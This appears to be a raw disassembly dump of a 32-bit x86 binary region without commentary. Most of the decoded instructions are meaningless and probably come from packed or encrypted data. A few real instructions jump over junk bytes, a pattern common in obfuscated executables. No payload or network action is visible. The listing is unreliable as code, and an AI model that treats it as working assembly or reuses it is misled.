  40519d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40519e:	sbb    bl,BYTE PTR [esi-0x39b8d015]
  4051a4:	mov    ebx,0xa8be2353
  4051a9:	cld    
  4051aa:	test   DWORD PTR [ebp-0x66332e9d],edx
  4051b0:	xchg   edi,eax
  4051b1:	adc    BYTE PTR [eax],ah
  4051b3:	push   0xd56d69d7
  4051b8:	xchg   ebp,eax
  4051b9:	imul   ebx,DWORD PTR [esi],0x7e
  4051bc:	push   ss
  4051bd:	mov    cl,0x7e
  4051bf:	push   cs
  4051c0:	clc    
  4051c1:	addr16 hlt 
  4051c3:	add    BYTE PTR [ebp-0x9],0xb4
  4051c7:	inc    ebp
  4051c8:	jns    0x4051df
  4051ca:	sbb    al,0xe0
  4051cc:	mov    dl,0xd8
  4051ce:	inc    ecx
  4051cf:	xchg   ebx,eax
  4051d0:	add    eax,0x270c01a0
  4051d5:	repz dec ebx
  4051d7:	mov    dh,0x96
  4051d9:	fdivr  DWORD PTR [ebx+eax*8+0x28ffdb98]
  4051e0:	mov    eax,0xf1a184d1
  4051e5:	fwait
  4051e6:	jg     0x4051b5
  4051e8:	xchg   ebp,ebp
  4051ea:	pop    edi
  4051eb:	aas    
  4051ec:	fs push edx
  4051ee:	call   0xef665a93
  4051f3:	cdq    
  4051f4:	and    bh,BYTE PTR [edi-0x22]
  4051f7:	outs   dx,DWORD PTR ds:[esi]
  4051f8:	fmul   st,st(6)
  4051fa:	sbb    edi,DWORD PTR [esi]
  4051fc:	cmp    eax,0x28bbe4d9
  405201:	out    dx,eax
  405202:	adc    eax,0xab15e7f3
  405207:	loop   0x405242
  405209:	pop    edx
  40520a:	mov    cl,0xa6
  40520c:	pushf  
  40520d:	mov    ds:0xbd2dada3,eax
  405212:	pop    ecx
  405213:	fwait
  405214:	mov    al,0x4
  405216:	das    
  405217:	add    eax,0x117f8c0e
  40521c:	pop    ebx
  40521d:	fsubr  QWORD PTR [edx-0x68]
  405220:	mov    esp,DWORD PTR [edi]
  405222:	imul   edx,DWORD PTR ss:[esi-0x67],0x5d3a4690
  40522a:	or     ch,BYTE PTR ds:0xb89d10f
  405230:	fstp   DWORD PTR [eax+0x7b]
  405233:	shl    BYTE PTR [ecx],cl
  405235:	push   edi
  405236:	ss in  al,dx
  405238:	test   ecx,esi
  40523a:	push   ebp
  40523b:	iret   
  40523c:	sbb    edi,ebp
  40523e:	mov    al,0x54
  405240:	and    DWORD PTR [eax],eax
  405242:	sbb    dh,BYTE PTR [ebx-0x5b]
  405245:	sahf   
  405246:	fiadd  DWORD PTR fs:[esi+0x35772634]
  40524d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40524f:	or     BYTE PTR [edx],ah
  405251:	mov    esp,0xe476f6b3
  405256:	out    dx,eax
  405257:	stos   BYTE PTR es:[edi],al
  405258:	and    al,0xd8
  40525a:	ins    BYTE PTR es:[edi],dx
  40525b:	in     al,dx
  40525c:	or     eax,DWORD PTR [esi]
  40525e:	shl    DWORD PTR [ebp-0x18e287ed],cl
  405264:	dec    edx
  405265:	out    0x87,eax
  405267:	sub    edx,eax
  405269:	inc    edi
  40526a:	cmp    BYTE PTR [eax+0x79],0x66
  40526e:	dec    ebp
  40526f:	lds    edi,FWORD PTR [ecx-0x13]
  405272:	loop   0x405247
  405274:	cmp    ebp,0xffffff9f
  405277:	xor    ch,BYTE PTR [ebx-0x28fa8dc6]
  40527d:	cmp    ebx,esp
  40527f:	mov    ds:0x4d8fbcd2,eax
  405284:	loopne 0x405260
  405286:	sahf   
  405287:	lea    esi,[eax+0x1e]
  40528a:	hlt    
  40528b:	icebp  
  40528c:	inc    eax
  40528d:	mov    ebp,0x31bcd126
  405292:	aam    0xf2
  405294:	mov    dh,0x13
  405296:	xor    DWORD PTR [ecx-0x5ea9d00b],ebp
  40529c:	dec    edi
  40529d:	std    
  40529e:	call   0xe3a2bb0f
  4052a3:	idiv   DWORD PTR [eax]
  4052a5:	lds    eax,FWORD PTR [eax]
  4052a7:	jne    0x40530e
  4052a9:	xchg   esi,eax
  4052aa:	iret   
  4052ab:	stos   DWORD PTR es:[edi],eax
  4052ac:	int3   
  4052ad:	add    al,0xc
  4052af:	les    edi,FWORD PTR [ecx-0x78baf5c1]
  4052b5:	repz push 0xffffffc2
  4052b8:	(bad)  
  4052b9:	addr16 cli 
  4052bb:	retf   0x8906
  4052be:	std    
  4052bf:	jmp    DWORD PTR [ecx-0x31]
  4052c2:	arpl   WORD PTR ds:0x7d867f07,sp
  4052c8:	(bad)
  4052cb:	push   edi
  4052cc:	into   
  4052cd:	mov    al,cs:0xc94cbb32
  4052d3:	dec    BYTE PTR [edx]
  4052d5:	push   0xba7ca041
  4052da:	jmp    0x40528b
  4052dc:	sub    ebx,esp
  4052de:	sahf   
  4052df:	(bad)  
  4052e0:	std    
  4052e1:	and    eax,0x2caa09e8
  4052e6:	sar    esi,0xf2
  4052e9:	jbe    0x405325
  4052eb:	in     eax,dx
  4052ec:	dec    edi
  4052ed:	stos   BYTE PTR es:[edi],al
  4052ee:	test   DWORD PTR [ecx],0x8ae3a289
  4052f4:	addr16 sub esi,ebx
  4052f7:	(bad)  
  4052f8:	mov    BYTE PTR [ebx],0xa1
  4052fb:	push   ebx
  4052fc:	rcl    BYTE PTR [esi],1
  4052fe:	adc    DWORD PTR [ebx],edx
  405300:	loop   0x4052dc
  405302:	fistp  DWORD PTR [ebx]
  405304:	inc    ebp
  405305:	mov    cl,0x61
  405307:	retf   0xf2c9
  40530a:	test   DWORD PTR [edi+eiz*1],ebx
  40530d:	xchg   ebx,eax
  40530e:	cmp    eax,0x3cfe0dd6
  405313:	outs   dx,BYTE PTR ds:[esi]
  405314:	and    DWORD PTR [edx],eax
  405316:	and    dh,BYTE PTR [eax-0x4cd6c6f2]
  40531c:	mov    eax,ds:0xb34e2b01
  405321:	sbb    al,0xe7
  405323:	call   0xe996fa60
  405328:	pop    eax
  405329:	inc    DWORD PTR [edi-0x3]
  40532c:	adc    al,0xf6
  40532e:	dec    ebp
  40532f:	outs   dx,BYTE PTR ds:[esi]
  405330:	ins    DWORD PTR es:[edi],dx
  405331:	ss stc 
  405333:	sbb    edi,esp
  405335:	adc    ebp,0xfffffff5
  405338:	popf   
  405339:	jle    0x405342
  40533b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40533c:	aas    
  40533d:	push   edi
  40533e:	pop    es
  40533f:	mov    dh,0xb2
  405341:	imul   esi,DWORD PTR [edx-0x2cef5a27],0xad4f7aca
  40534b:	in     eax,0x6b
  40534d:	ds sub al,0x5b
  405350:	mov    BYTE PTR [eax+0x5e],dl
  405353:	int3   
  405354:	fsub   DWORD PTR [ecx-0x2412ecb0]
  40535a:	push   cs
  40535b:	icebp  
  40535c:	ror    DWORD PTR [edx-0x7f],0xec
  405360:	mov    DWORD PTR [ecx],0x98f15df7
  405366:	popa   
  405367:	ins    DWORD PTR es:[edi],dx
  405368:	cs sub al,ah
  40536b:	inc    esi
  40536c:	mov    ds:0x4d4f9cb6,eax
  405371:	pop    es
  405372:	push   ss
  405373:	add    al,ah
  405375:	mov    eax,ds:0x68284aa8
  40537a:	pusha  
  40537b:	xor    BYTE PTR [eax],dl
  40537d:	cmp    eax,0xa5f9a65b
  405382:	es jmp 0xfec6:0xfd041512
  40538a:	pop    edi
  40538b:	test   eax,0x7da5787a
  405390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405391:	mov    fs,ebx
  405393:	popa   
  405394:	sti    
  405395:	push   edx
  405396:	mov    ds:0x5c35ccaf,eax
  40539b:	xor    BYTE PTR [esi+ecx*8-0x216905cc],dh
  4053a2:	retf   0x3d87
  4053a5:	test   cl,0x78
  4053a8:	dec    BYTE PTR [esi+0x3fe54c8d]
  4053ae:	jle    0x405336
  4053b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053b1:	push   ebp
  4053b2:	mov    BYTE PTR [esi+0x5d],dh
  4053b5:	fist   DWORD PTR [ebx]
  4053b7:	sub    al,ah
  4053b9:	stos   BYTE PTR es:[edi],al
  4053ba:	and    DWORD PTR [ebp+0x1c],esp
  4053bd:	sub    al,0x15
  4053bf:	or     esi,DWORD PTR [ebx-0x61af5a5e]
  4053c5:	popf   
  4053c6:	sub    al,0xa1
  4053c8:	sar    DWORD PTR [edx+0x71fdf396],0x2c
  4053cf:	add    eax,0x8ce5c1f1
  4053d4:	xlat   BYTE PTR ds:[ebx]
  4053d5:	or     ah,BYTE PTR [ebx-0x37]
  4053d8:	ja     0x40542f
  4053da:	vpcmpeqb xmm4,xmm7,XMMWORD PTR [eax+edi*4]
  4053df:	pop    eax
  4053e0:	push   DWORD PTR [ecx+0x3a]
  4053e3:	(bad)  
  4053e4:	jne    0x4053a5
  4053e6:	lods   eax,DWORD PTR ds:[esi]
  4053e7:	and    al,0x4b
  4053e9:	mov    ?,WORD PTR ds:0xe7c1cb11
  4053ef:	cli    
  4053f0:	enter  0xde29,0x87
  4053f4:	xor    eax,0xaddcc7a8
  4053f9:	push   0xc5126361
  4053fe:	add    al,0x51
  405400:	sub    DWORD PTR ss:[ebp+0x3d205d17],0x1f
  405408:	stos   DWORD PTR es:[edi],eax
  405409:	xor    DWORD PTR [ebx+0x58125b5],0xffffff93
  405410:	mov    ebx,0x7af1eaa1
  405415:	ins    BYTE PTR es:[edi],dx
  405416:	arpl   WORD PTR [edi+eiz*8+0x1d],bp
  40541a:	addr16 ja 0x405472
  40541d:	es test eax,0xc215ed78
  405423:	mov    ebp,ds
  405425:	in     eax,0xd8
  405427:	sbb    eax,0x690194cb
  40542c:	push   esi
  40542d:	or     eax,0xa093b294
  405432:	mov    esp,0xe360589e
  405437:	pop    ebx
  405438:	loop   0x40547f
  40543a:	mov    ds:0x4e41988e,eax
  40543f:	dec    ebx
  405440:	mov    ds:0x99d67a31,al
  405445:	inc    ebx
  405446:	lahf   
  405447:	lock mov WORD PTR [ebp-0x80],ss
  40544b:	test   eax,0x9b0269f
  405450:	lods   eax,DWORD PTR ds:[esi]
  405451:	mov    WORD PTR [ebx+0x7e],?
  405454:	ret    
  405455:	sahf   
  405456:	fisttp QWORD PTR [edi-0x32]
  405459:	jne    0x405438
  40545b:	shr    BYTE PTR [ecx-0x67],0x19
  40545f:	jns    0x4054b0
  405461:	push   ss
  405462:	ret    0x9aa9
  405465:	and    eax,0x2c99a63f
  40546a:	(bad)  
  40546b:	or     edi,DWORD PTR [ebx-0x44]
  40546e:	sub    BYTE PTR [esi-0x50d982e2],dh
  405474:	inc    eax
  405475:	cmp    BYTE PTR [eax+edi*8],dl
  405478:	mov    ebp,0x98e5bd15
  40547d:	clts   
  40547f:	jmp    0x4054df
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e804
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e76b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	dec    ebx
  4054a9:	ins    DWORD PTR es:[edi],dx
  4054aa:	pusha  
  4054ab:	add    DWORD PTR [eax],edx
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40550d
  4054b5:	test   al,0x4a
  4054b7:	mov    WORD PTR [ebx],ds
  4054b9:	push   ecx
  4054ba:	cmp    ah,BYTE PTR [edi]
  4054bc:	es popf 
  4054be:	stos   DWORD PTR es:[edi],eax
  4054bf:	pop    edi
  4054c0:	cli    
  4054c1:	(bad)  
  4054c2:	fwait
  4054c3:	add    DWORD PTR [edi-0x45],esp
  4054c6:	enter  0x42ea,0x56
  4054ca:	dec    edi
  4054cb:	xlat   BYTE PTR ds:[ebx]
  4054cc:	mov    al,0x1a
  4054ce:	pop    esi
  4054cf:	and    eax,0x9529c0a7
  4054d4:	call   0xd253:0xfe9c76c3
  4054db:	jmp    0x7d9e:0xef72135e
  4054e2:	adc    BYTE PTR [edi*2+0x6db8c851],bh
  4054e9:	sti    
  4054ea:	jmp    0x4054c9
  4054ec:	rcr    BYTE PTR [edi+0x1e],0xbe
  4054f0:	scas   eax,DWORD PTR es:[edi]
  4054f1:	dec    ecx
  4054f2:	popa   
  4054f3:	jb     0x4054c1
  4054f5:	cld    
  4054f6:	pusha  
  4054f7:	xchg   edi,eax
  4054f8:	inc    ebp
  4054f9:	fdiv   st,st(4)
  4054fb:	xor    BYTE PTR [esi+0x3b8829d5],ah
  405501:	shl    DWORD PTR [ecx],0x0
  405504:	push   ds
  405505:	shr    BYTE PTR [eax-0x7efd021],1
  40550b:	dec    ecx
  40550c:	clc    
  40550d:	cmp    DWORD PTR [ebp+0x15],ebp
  405510:	add    ebp,0x20
  405513:	sti    
  405514:	lahf   
  405515:	repz adc esi,ecx
  405518:	pusha  
  405519:	xor    eax,0xb67ceffb
  40551e:	test   al,0x3
  405520:	cmp    eax,ebx
  405522:	push   eax
  405523:	fnstenv [edx-0x8543f19]
  405529:	jae    0x4054d6
  40552b:	cmp    DWORD PTR [edx-0xa],ebp
  40552e:	aad    0x55
  405530:	push   eax
  405531:	ds mov al,0xd6
  405534:	call   0x4343c136
  405539:	adc    eax,0x4e47475b
  40553e:	popf   
  40553f:	ins    BYTE PTR es:[edi],dx
  405540:	jmp    0xd7b358f3
  405545:	dec    esp
  405546:	pop    es
  405547:	xchg   BYTE PTR [edx],dh
  405549:	mov    ds:0x154e1142,eax
  40554e:	jo     0x405545
  405550:	xlat   BYTE PTR ds:[ebx]
  405551:	loope  0x4055c9
  405553:	sbb    al,0x1d
  405555:	test   al,0x15
  405557:	das    
  405558:	dec    edx
  405559:	add    BYTE PTR [ebx-0x3c625e3f],0xca
  405560:	mov    dl,0xeb
  405562:	xor    BYTE PTR [esi+0x31],bl
  405565:	xor    DWORD PTR [ecx-0x37d2e263],0x28b5d755
  40556f:	push   ds
  405570:	mov    ebx,0x5645e9b9
  405575:	sti    
  405576:	test   BYTE PTR ds:0x22c2f845,ah
  40557c:	sub    ch,BYTE PTR [eax-0x56]
  40557f:	sbb    eax,0x933e1f14
  405584:	in     al,dx
  405585:	das    
  405586:	jnp    0x405597
  405588:	mov    edx,0x5f63b09c
  40558d:	lods   eax,DWORD PTR ds:[esi]
  40558e:	dec    esi
  40558f:	xor    eax,0x9f7b3e37
  405594:	and    eax,DWORD PTR [edi+0x3f]
  405597:	aad    0xb
  405599:	push   esp
  40559a:	outs   dx,BYTE PTR ds:[esi]
  40559b:	adc    DWORD PTR [ecx],esi
  40559d:	mov    ds:0xa6cf5648,al
  4055a2:	cli    
  4055a3:	mov    dh,0xe4
  4055a5:	in     al,0xff
  4055a7:	loop   0x405547
  4055a9:	cli    
  4055aa:	pusha  
  4055ab:	ins    DWORD PTR es:[edi],dx
  4055ac:	mov    ah,0x54
  4055ae:	push   esp
  4055af:	shl    DWORD PTR [esp+esi*8-0x4c41fc0d],cl
  4055b6:	stos   BYTE PTR es:[edi],al
  4055b7:	das    
  4055b8:	test   dl,0x21
  4055bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055bc:	leave  
  4055bd:	xor    BYTE PTR [edi+0x75],bl
  4055c0:	aam    0x44
  4055c2:	dec    esi
  4055c3:	jns    0x4055d8
  4055c5:	fs out 0x9,al
  4055c8:	push   ebp
  4055c9:	sbb    al,0xe6
  4055cb:	adc    ecx,0x10becb73
  4055d1:	into   
  4055d2:	mov    eax,0xa83321a5
  4055d7:	sub    edx,DWORD PTR [edi-0x29]
  4055da:	inc    ebp
  4055db:	sub    al,BYTE PTR [esi-0x6328141b]
  4055e1:	xchg   edi,eax
  4055e2:	cdq    
  4055e3:	stos   BYTE PTR es:[edi],al
  4055e4:	xlat   BYTE PTR ds:[ebx]
  4055e5:	scas   al,BYTE PTR es:[edi]
  4055e6:	gs std 
  4055e8:	mov    edi,0xa5424762
  4055ed:	push   es
  4055ee:	mov    al,0x67
  4055f0:	mov    al,0x6c
  4055f2:	mov    bh,0xe3
  4055f4:	gs inc edi
  4055f6:	cdq    
  4055f7:	fst    QWORD PTR [eax+esi*1+0x29415dc3]
  4055fe:	dec    ebp
  4055ff:	pushf  
  405600:	mov    bh,0xb7
  405602:	jo     0x4055d5
  405604:	hlt    
  405605:	push   ss
  405606:	leave  
  405607:	js     0x405645
  405609:	enter  0xdd7e,0xce
  40560d:	xchg   edi,eax
  40560e:	mov    dh,0x25
  405610:	or     al,0x3c
  405612:	adc    DWORD PTR [esi],0xffffff98
  405615:	mul    BYTE PTR [eax]
  405617:	sbb    ebx,edi
  405619:	out    dx,eax
  40561a:	mov    eax,0xd36ddbeb
  40561f:	ret    0x650a
  405622:	mov    cl,0x70
  405624:	adc    BYTE PTR [edi+0x74],0xbb
  405628:	mov    cl,0x96
  40562a:	lahf   
  40562b:	xor    ah,BYTE PTR [esi]
  40562d:	nop
  40562e:	(bad)  
  40562f:	nop
  405630:	retf   
  405631:	jg     0x40564c
  405633:	dec    esp
  405634:	scas   al,BYTE PTR es:[edi]
  405635:	lods   al,BYTE PTR ds:[esi]
  405636:	(bad)  
  405637:	sub    dh,cl
  405639:	adc    ah,al
  40563b:	(bad)  
  40563c:	ficomp DWORD PTR [edx+0x29]
  40563f:	inc    esi
  405640:	dec    ebp
  405641:	(bad)  
  405642:	add    al,0x83
  405644:	idiv   BYTE PTR [eax+0x3d3fe81b]
  40564a:	jo     0x4056ba
  40564c:	out    0xc6,eax
  40564e:	jae    0x4056b5
  405650:	mov    ecx,0xcd5d17fe
  405655:	add    al,0x3b
  405657:	push   ebp
  405658:	mov    esi,0xb0f0594b
  40565d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565e:	push   0xc6196aa
  405663:	shl    DWORD PTR [esi+edi*8],cl
  405666:	imul   ecx,DWORD PTR [ecx-0x30c0c283],0x8c29035a
  405670:	das    
  405671:	je     0x4056ab
  405673:	stos   DWORD PTR es:[edi],eax
  405674:	sub    al,0xd5
  405676:	les    ebx,FWORD PTR [eax+eiz*2+0x1b]
  40567a:	(bad)  
  40567b:	fsub   QWORD PTR [ebx]
  40567d:	rol    BYTE PTR [ebx-0x241978c3],1
  405683:	stc    
  405684:	sbb    eax,0x426dfe09
  405689:	out    0x66,al
  40568b:	into   
  40568c:	sub    DWORD PTR [edi+0xc9fc8cc],edx
  405692:	xor    BYTE PTR [ecx-0x13],ch
  405695:	les    ebp,FWORD PTR ss:[edx-0x4f843543]
  40569c:	pop    esp
  40569d:	mov    al,0x37
  40569f:	push   ebx
  4056a0:	dec    eax
  4056a1:	dec    ebp
  4056a2:	test   ebx,eax
  4056a4:	cmp    BYTE PTR [esi+0x40],dh
  4056a7:	jae    0x40570f
  4056a9:	mov    ah,0x5d
  4056ab:	jb     0x405637
  4056ad:	sbb    edi,DWORD PTR [edi+0x7f01744f]
  4056b3:	jmp    0x4056d5
  4056b5:	xchg   BYTE PTR [edx+ebp*8-0x58],ch
  4056b9:	mov    eax,0x8c450b33
  4056be:	or     ax,0x9a09
  4056c2:	nop
  4056c3:	in     eax,dx
  4056c4:	in     al,0x7d
  4056c6:	mov    edi,0x8cdb3883
  4056cb:	lea    eax,[edi+eiz*1+0x75]
  4056cf:	call   0xbf4a:0x25213ff5
  4056d6:	leave  
  4056d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d8:	cmp    ebp,eax
  4056da:	dec    esp
  4056db:	repz in eax,0x62
  4056de:	outs   dx,BYTE PTR ds:[esi]
  4056df:	jge    0x40566b
  4056e1:	add    eax,0xc0d0ccc5
  4056e6:	into   
  4056e7:	and    eax,0xf4260f8b
  4056ec:	push   ds
  4056ed:	mov    ah,0xdf
  4056ef:	rcl    DWORD PTR [edx+0x3d],1
  4056f2:	pop    edx
  4056f3:	xchg   esp,eax
  4056f4:	(bad)  
  4056f5:	mov    ds:0xd8992007,eax
  4056fa:	imul   ebp,ebp,0xe6b77fa7
  405700:	das    
  405701:	pushf  
  405702:	fcmovu st,st(1)
  405704:	cmp    dl,BYTE PTR [edx+0x7]
  405707:	es icebp 
  405709:	fwait
  40570a:	jecxz  0x40574c
  40570c:	jnp    0x4056b8
  40570e:	jne    0x4056cf
  405710:	(bad)  
  405712:	call   0x5400:0x8b6c14f6
  405719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40571a:	pop    es
  40571b:	repz sti 
  40571d:	repnz pop esp
  40571f:	vunpcklps ymm3,ymm5,ymm5
  405723:	mov    ebx,0x16ed8e18
  405728:	icebp  
  405729:	adc    eax,0x33c64e87
  40572f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405730:	shl    DWORD PTR [ecx],1
  405732:	(bad)  
  405733:	aas    
  405734:	pop    edx
  405735:	jle    0x4057a2
  405737:	cs xor al,0xbb
  40573a:	into   
  40573b:	xchg   edi,eax
  40573c:	pop    esp
  40573d:	xchg   BYTE PTR [ebx],dl
  40573f:	sbb    eax,0x3f4fb6b0
  405744:	xchg   edi,eax
  405745:	or     eax,0xdb2111fb
  40574a:	jnp    0x405786
  40574c:	dec    edi
  40574d:	loopne 0x405715
  40574f:	mov    BYTE PTR [ecx],dh
  405751:	test   eax,0xd5e24055
  405756:	mov    cl,BYTE PTR ds:0x59affd9
  40575c:	and    BYTE PTR [edx-0x3d],dh
  40575f:	cs stos BYTE PTR es:[edi],al
  405761:	fstp   TBYTE PTR [ecx+0x6e]
  405764:	shl    cl,1
  405766:	ins    BYTE PTR es:[edi],dx
  405767:	rcl    edi,cl
  405769:	leave  
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fe06
  405772:	and    eax,DWORD PTR ds:0x42fdfa
  405778:	mov    ds:0x42fe06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x641391be],eax
  405790:	cmp    ecx,ecx
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	and    eax,DWORD PTR [ebx+0x3f]
  40579d:	pop    es
  40579e:	arpl   WORD PTR [edi+0x7d6e16e3],bx
  4057a4:	pushf  
  4057a5:	xchg   edi,eax
  4057a6:	inc    esp
  4057a7:	sti    
  4057a8:	iret   
  4057a9:	(bad)  
  4057aa:	(bad)  
  4057ab:	mov    edx,0x14dde6e
  4057b0:	scas   al,BYTE PTR es:[edi]
  4057b1:	loope  0x4057c4
  4057b3:	int3   
  4057b4:	lds    edx,FWORD PTR [edx]
  4057b6:	in     eax,0x30
  4057b8:	sar    DWORD PTR [eax],cl
  4057ba:	inc    esp
  4057bb:	or     esi,DWORD PTR [esp+ebx*4-0x44]
  4057bf:	outs   dx,DWORD PTR ds:[esi]
  4057c0:	mov    edx,0xedb938c7
  4057c5:	test   eax,0xe336303f
  4057ca:	out    0xc9,al
  4057cc:	mov    WORD PTR [ecx+esi*8-0x5],?
  4057d0:	mov    cs,esi
  4057d2:	shl    al,cl
  4057d4:	pop    edi
  4057d5:	outs   dx,BYTE PTR ds:[esi]
  4057d6:	jae    0x40577b
  4057d8:	mov    al,0x7f
  4057da:	mov    bl,0xe5
  4057dc:	les    edx,FWORD PTR [ecx]
  4057de:	fs stos DWORD PTR es:[edi],eax
  4057e0:	jp     0x4057ae
  4057e2:	pop    esi
  4057e3:	mov    ds:0xebd8c32d,al
  4057e8:	mov    cs,ecx
  4057ea:	lock pop ss
  4057ec:	push   ebp
  4057ed:	stc    
  4057ee:	jp     0x4057a2
  4057f0:	sbb    al,0x20
  4057f2:	sbb    ecx,ebp
  4057f4:	push   edi
  4057f5:	pop    ecx
  4057f6:	mov    eax,ds:0x4d2db3ca
  4057fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057fc:	nop
  4057fd:	lea    edi,[edi-0x74d73ebb]
  405803:	push   cs
  405804:	fnstcw WORD PTR [esi]
  405806:	jns    0x405814
  405808:	dec    ecx
  405809:	test   dl,dh
  40580b:	mov    esp,DWORD PTR [edx-0x20693e33]
  405811:	or     al,0xdc
  405813:	leave  
  405814:	sub    BYTE PTR [edi],dl
  405816:	sbb    eax,0x2b864c92
  40581b:	or     al,0xb0
  40581d:	xor    BYTE PTR [ebx],bl
  40581f:	add    DWORD PTR [edx-0x2725cd98],0xfffffff5
  405826:	js     0x4057ef
  405828:	inc    eax
  405829:	add    eax,0xd9178aaa
  40582e:	dec    edx
  40582f:	dec    esp
  405830:	or     DWORD PTR [eax-0x26],ebp
  405833:	pusha  
  405834:	aam    0xff
  405836:	jp     0x40587e
  405838:	push   esp
  405839:	pop    edx
  40583a:	or     BYTE PTR [edi-0x1a54df0],dl
  405840:	or     BYTE PTR [ecx],cl
  405842:	mov    ecx,0x90de244f
  405847:	mov    esi,DWORD PTR ds:0x13bd7c06
  40584d:	cs ins BYTE PTR es:[di],dx
  405850:	cmovle ebp,ecx
  405853:	loopne 0x405897
  405855:	repz sbb DWORD PTR [ebx-0x76dd4fb2],0xfffffffd
  40585d:	cmp    DWORD PTR [eax-0x55],eax
  405860:	mov    eax,ds:0xf75b9a60
  405865:	adc    BYTE PTR [ebx+esi*8+0x6072beb0],0xa0
  40586d:	inc    ebp
  40586e:	leave  
  40586f:	push   ebp
  405870:	adc    BYTE PTR [ebp+0x27ab070e],bh
  405876:	xlat   BYTE PTR ds:[ebx]
  405877:	(bad)  
  405879:	fmul   QWORD PTR [esi-0x27483a9f]
  40587f:	int3   
  405880:	cs pop es
  405882:	mov    edi,0xef3f69a6
  405887:	cdq    
  405888:	hlt    
  405889:	mov    ds:0xe6dd8539,eax
  40588e:	xor    BYTE PTR [eax],0x6f
  405891:	call   0x682d2c8a
  405896:	adc    al,BYTE PTR [ebx]
  405898:	or     al,0xf0
  40589a:	push   eax
  40589b:	gs test eax,0x9949453b
  4058a1:	pop    ecx
  4058a2:	retf   
  4058a3:	or     ch,dl
  4058a5:	js     0x4058a2
  4058a7:	lock shr BYTE PTR [edi+eiz*1],0x15
  4058ac:	aas    
  4058ad:	push   ebp
  4058ae:	stc    
  4058af:	out    dx,al
  4058b0:	cmp    ebp,edx
  4058b2:	mov    DWORD PTR [ebp-0x45],eax
  4058b5:	fstp   TBYTE PTR [edi-0x69105de]
  4058bb:	xchg   ecx,eax
  4058bc:	jge    0x4058fb
  4058be:	mov    ebp,0x5fb1569c
  4058c3:	mov    esi,0xd295d80c
  4058c8:	push   edi
  4058c9:	inc    DWORD PTR [ecx+0x4c]
  4058cc:	xlat   BYTE PTR ds:[ebx]
  4058cd:	xor    al,cl
  4058cf:	xchg   ebx,eax
  4058d0:	not    BYTE PTR [ebp+0x44b6650d]
  4058d6:	retf   0x6e89
  4058d9:	lock pop ss
  4058db:	ret    
  4058dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058dd:	shl    DWORD PTR [eax+edx*1+0x18],1
  4058e1:	mov    esi,0xb1d7f0a8
  4058e6:	lods   eax,DWORD PTR ds:[esi]
  4058e7:	cmp    edi,DWORD PTR [ebp-0x60]
  4058ea:	mov    ds:0x1b46ef73,eax
  4058ef:	ja     0x40590f
  4058f1:	pop    edi
  4058f2:	cmc    
  4058f3:	aas    
  4058f4:	(bad)  
  4058f5:	sub    BYTE PTR [edx+0x61],cl
  4058f8:	push   edx
  4058f9:	add    bl,BYTE PTR [ebx-0x1b0d5758]
  4058ff:	mov    ecx,0xa158f6c5
  405904:	hlt    
  405905:	mov    ch,0x4a
  405907:	cdq    
  405908:	jge    0x4058da
  40590a:	adc    eax,0xd5a9640e
  40590f:	cmp    cl,dh
  405911:	sub    al,cl
  405913:	js     0x40595a
  405915:	les    ecx,FWORD PTR ds:0xa1b0182f
  40591b:	jne    0x40590a
  40591d:	jmp    0x2ae052fd
  405922:	and    esp,edi
  405924:	pop    ebp
  405925:	enter  0xeab1,0x3d
  405929:	in     eax,dx
  40592a:	scas   eax,DWORD PTR es:[edi]
  40592b:	pusha  
  40592c:	jp     0x4058f7
  40592e:	jp     0x405945
  405930:	dec    eax
  405931:	mov    al,0x60
  405933:	mov    ds:0x3d7e1e46,eax
  405938:	mov    ah,0x7b
  40593a:	mov    ch,0xb8
  40593c:	cmp    esp,DWORD PTR [edi+edx*2]
  40593f:	fs pop ebx
  405941:	lahf   
  405942:	ins    BYTE PTR es:[edi],dx
  405943:	int    0x46
  405945:	dec    esp
  405946:	mov    eax,0xf5266206
  40594b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40594c:	stc    
  40594d:	push   esp
  40594e:	xor    cl,ch
  405950:	lahf   
  405951:	jns    0x40595c
  405953:	(bad)  
  405954:	(bad)  
  405955:	and    DWORD PTR [ebx-0x53670c9d],eax
  40595b:	(bad)  [esi+0x3e]
  40595e:	push   cs
  40595f:	mov    esi,0x846b0333
  405964:	hlt    
  405965:	inc    ecx
  405966:	inc    edi
  405967:	call   0xb4e2:0xc2dc2225
  40596e:	push   esp
  40596f:	out    0x15,eax
  405971:	adc    dh,BYTE PTR [eax+0x2]
  405974:	repnz leave 
  405976:	fs mov ah,0x61
  405979:	push   esp
  40597a:	call   0xd35f:0xa0be10e7
  405981:	addr16 jne 0x4059b2
  405984:	mov    ebx,0x99e5bd92
  405989:	and    eax,0x1241fca2
  40598e:	aas    
  40598f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405990:	inc    ebx
